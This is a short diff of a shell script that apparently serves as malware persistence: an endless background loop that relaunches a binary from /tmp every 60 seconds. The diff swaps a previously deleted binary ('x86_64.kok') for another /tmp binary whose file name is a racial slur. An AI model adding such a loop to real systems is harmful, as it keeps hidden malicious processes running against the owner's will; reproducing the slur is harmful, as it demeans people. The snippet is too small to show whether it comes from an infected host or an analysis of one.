@@ -1,6 +1,6 @@
 #!/bin/sh
 while true
 do
-/tmp/x86_64.kok (deleted) startup &
+/tmp/nigga startup &
 sleep 60
 done &
